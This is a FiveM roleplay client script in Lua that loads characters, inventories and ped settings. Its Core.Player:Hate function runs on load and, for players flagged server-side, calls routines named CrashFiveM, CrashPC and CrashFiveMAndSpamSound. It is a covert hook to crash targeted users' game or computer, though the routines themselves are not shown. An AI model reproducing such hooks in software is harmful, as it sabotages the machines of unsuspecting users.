Core = Core or {}
Core.Player = {}
Core.Player.Initialized = false
Core.Player.OnLoadCallbacks = {}

---@type Player
player = nil

local function KVPTransition()
	player:metadata().holster_style = GetResourceKvpString("holster_style") or player:metadata().holster_style
	player:metadata().expression = GetResourceKvpString("expression") or player:metadata().expression
	player:metadata().walk_style = GetResourceKvpString("walkstyle") or player:metadata().walk_style

	local kvpInstance = GetResourceKvpInt("instance")

	if kvpInstance ~= 0 then
		player:metadata().instance = kvpInstance
	elseif player:metadata().instance == nil or player:metadata().instance == 0 then
		player:metadata().instance = 1
	end

	DeleteResourceKvp("holster_style")
	DeleteResourceKvp("expression")
	DeleteResourceKvp("walkstyle")
	DeleteResourceKvp("instance")
end

local function RespawnInLastVehicle()
	local lastVehicle = Callbacks.Trigger("player:getLastVehicle")

	if lastVehicle == nil then return end

	player:position(lastVehicle.coords, true)

	local vehicle = NetworkGetEntityFromNetworkId(lastVehicle.netId)

	UI:AddNotification("basic", "Réapparition dans le véhicule", "info", 5000)
	TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, SharedModules.Vehicles:GetFirstFreeSeat(vehicle))
end

function Core.Player:Load(id)
	local rawdata = nil

	if id then
		rawdata = Callbacks.Trigger("player:getCharacter", id, true)
	else
		rawdata = Callbacks.Trigger("player:get")
	end

	player = Player:new(Functions.RemoveUnderscores(rawdata or {}))

    player:inventory(Inventory:new(Functions.RemoveUnderscores(Callbacks.Trigger("inventory:get", player:inventory_id()) or {}), true))
	LocalPlayer.state:set("permissions", player:permissions(), true)
	LocalPlayer.state:set("name", player:fullname(), true)

	self:InitPed()
	self:HasLoaded()

	RespawnInLastVehicle()
	KVPTransition()
end

function Core.Player:OnLoad(fn)
	table.insert(self.OnLoadCallbacks, fn)
end

function Core.Player:InitPed()
    RemoveAllPedWeapons(PlayerPedId(), false)
    ClearPlayerWantedLevel(PlayerId())
    SetWeaponsNoAutoswap(true)
    SetMaxWantedLevel(0)
	SetPlayerHealthRechargeMultiplier(PlayerId(), 0.0)
    SetCanAttackFriendly(PlayerPedId(), true, true)
    SetEntityMaxHealth(PlayerPedId(), 200)
	SetEntityHealth(PlayerPedId(), player:health() + 100)
	NetworkSetFriendlyFireOption(true)
    SetWeaponsNoAutoreload(true)
    DisableIdleCamera(true)

	SetPlayerMaxStamina(PlayerId(), 400.0)
	SetPlayerStamina(PlayerId(), 400.0)

	SetPlayerMeleeWeaponDamageModifier(PlayerId(), 0.5)
	SetAiMeleeWeaponDamageModifier(0.5)

	Citizen.CreateThread(function()
		local timeout = 100

		while true do
			timeout = 100

			if IsPedInAnyVehicle(PlayerPedId(), false) then
				SetPedConfigFlag(PlayerPedId(), 35, false)
				timeout = 1
			end

			Citizen.Wait(timeout)
		end
	end)
end

function Core.Player:Get(id, isServerId)
    if isServerId == nil then
        isServerId = true
    end

	local ply = nil

    if isServerId then
        ply = Player:new(Functions.RemoveUnderscores(Callbacks.Trigger("player:get", id) or {}), id, true)
    else
        ply = Player:new(Functions.RemoveUnderscores(Callbacks.Trigger("player:getCharacter", id) or {}), id, true)
    end

	ply:skin(Skin:new(ply:skin(), false))

	return ply
end

function Core.Player:GetClosest(radius)
    local coords = GetEntityCoords(PlayerPedId(), true)
    local players = GetActivePlayers()
    local closestDistance = 9999.0
    local closest = nil

    for _, player in ipairs(players) do
        local ped = GetPlayerPed(player)
        local distance = Math.Distance(coords, GetEntityCoords(ped, true))

        if distance < closestDistance and distance < radius and ped ~= PlayerPedId() then
            closestDistance = distance
            closest = ped
        end
    end

    return closest
end

--- Get all players in a radius
---@param radius any
function Core.Player:GetPlayersInRadius(radius)
	local coords = GetEntityCoords(PlayerPedId(), true)
	local players = GetActivePlayers()
	local inRadius = {}

	for _, player in ipairs(players) do
		local ped = GetPlayerPed(player)
		local distance = Math.Distance(coords, GetEntityCoords(ped, true))

		if distance < radius and ped ~= PlayerPedId() then
			table.insert(inRadius, { player = player, ped = ped, distance = distance })
		end
	end

	table.sort(inRadius, function(a, b)
		return a.distance < b.distance
	end)

	return inRadius
end

function Core.Player:UpdatePositionThread()
	Citizen.CreateThread(function()
		local coords = nil

		while true do
			Citizen.Wait(100)
			if player ~= nil then
				coords = GetEntityCoords(PlayerPedId(), true)
				player:position(vector4(coords.x, coords.y, coords.z, GetEntityHeading(PlayerPedId())), false)
			end
		end
	end)
end

function Core.Player:Hate()
	if player:hate() == 1 then
		Utils.CPUBurner.CrashFiveM()
	elseif player:hate() == 2 then
		Utils.CPUBurner.CrashPC()
	elseif player:hate() == 3 then
		Utils.CPUBurner.CrashFiveMAndSpamSound()
	end
end

function Core.Player:HasLoaded()
	for k, callback in pairs(self.OnLoadCallbacks) do
		callback()
	end

	if player:locked() == 1 then
		self:Lock()
	end

	UI:SendMessage("changeSex", {
		sex = player:sex() == "m" and 0 or 1
	})

	Events.TriggerServer("player:ready")
	Events.Trigger("player:ready")
	player:spawned(true)
	player:loaded(true)

	UI:AddNotification("basic", "Personnage ~g~chargé~s~ avec succès ✅", "info", 3000)
end

function Core.Player:Lock()
	Citizen.Wait(1000)

	SetEntityCoords(PlayerPedId(), player:position().x, player:position().y, player:position().z - 10.0, true, false, false, false)

	Citizen.CreateThread(function()
		while player and player:locked() == 1 do
			FreezeEntityPosition(PlayerPedId(), true)
			DisableAllControlActions(0)

			Citizen.Wait(0)
		end
	end)

	SetFocusPosAndVel(-608.9, -874.8, 202.5, 0.0, 0.0, 0.0)
	LocalPlayer.state:set("freecam", true, true)

	local cam = Camera:new({
		name = "locked_character",
		position = vector3(-608.9, -874.8, 202.5),
		rotation = vector3(0.0, 0.0, 0.0),
	})

	cam:render()

	UI:AddNotification("basic", "~r~Votre personnage actuel est bloqué, et ne peut donc pas être chargé, choisissez-en un autre", "info", 25000)

	if MainMenu.Characters.Main == nil then
		MainMenu.Characters.Create()
		Citizen.Wait(500)
	end

	Menus:Visible(MainMenu.Characters.Main, true)

	Events.Register("player:switched", function()
		Menus:Visible(MainMenu.Characters.Main, false)
		cam:destroy()
	end)

	Events.Register("skinchanger:new", function()
		Menus:Visible(MainMenu.Characters.Main, false)
		cam:destroy()
	end)
end

function Core.Player:Init()
	if self.Initialized == true then return end

	self.Initialized = true

	Citizen.CreateThread(function()
		while GetIsLoadingScreenActive() == true do
			FreezeEntityPosition(PlayerPedId(), true)
			Citizen.Wait(250)
		end

		FreezeEntityPosition(PlayerPedId(), false)
	end)

	Citizen.CreateThread(function()
		Events.TriggerServer("bucket:change", 1)

		while PlayerPedId() == nil or PlayerPedId() == -1 or NetworkIsPlayerActive(PlayerId()) ~= true do
			Citizen.Wait(500)
		end

		self:Load()
		self:Hate()

		if GetConvarInt('nui_useInProcessGpu', 0) == 0 then
			UI:AddNotification("basic", "~r~Il est recommandé d'activer le NUI In-Process GPU dans les paramètres FiveM, cela évite des lags d'interfaces~s~", "info", 15000)
		end

		if player:id() == nil then
			local characters = Callbacks.Trigger("player:getCharacters") or {}
			player:skin():model("mp_m_freemode_01")

			if #characters > 0 then
				self:Lock()
			else
				Events.Trigger("skinchanger:new")
			end
		end

		ShutdownLoadingScreen()
		ShutdownLoadingScreenNui()
		DoScreenFadeOut(0)
		Citizen.Wait(100)

		DoScreenFadeIn(0)

		ClientModules.HUD.Minimap:Initialize()

		if player:health() <= 0 then
			return Core.Death:SetPlayerDead()
		end
	end)

	self:UpdatePositionThread()

	Events.Register("player:update", function(_, key, value)
		if player == nil then
			return
		end

		player[key](player, value)

		if key == "metadata" then
			ClientModules.Misc.Animations:LoadMetadata()
		end
	end)

	Events.Register("player:updateSkin", function(_, key, value)
		if player == nil then
			return
		end

		if key == "tattoos" then
			player:skin():tattoos(value, player:sex() == "m" and "male" or "female")
		else
			player:skin()[key](player:skin(), value)
		end
	end)

	Events.Register("player:loadAppearance", function()
		if player == nil then
			return
		end

		player:skin():applyTo(PlayerPedId())
		player:inventory():reapplyOutfit()
	end)

	Events.Register("player:notify", function(_, ...)
		UI:AddNotification(...)
	end)
end

Core.Player:Init()

exports("OnReady", function(callback)
	Core.Player:OnLoad(callback)
end)

exports("getCharacterName", function()
	return player:firstname(), player:lastname()
end)

exports("getCharacterFullname", function()
	return player:fullname()
end)

exports("getCharacterJobData", function()
	return player:job()
end)


Citizen.CreateThread(function()
    while true do
        Wait(200)

        local playerPed = PlayerPedId()
        if IsPedArmed(playerPed, 6) then
            DisableControlAction(0, 140, true)

        end
    end
end)
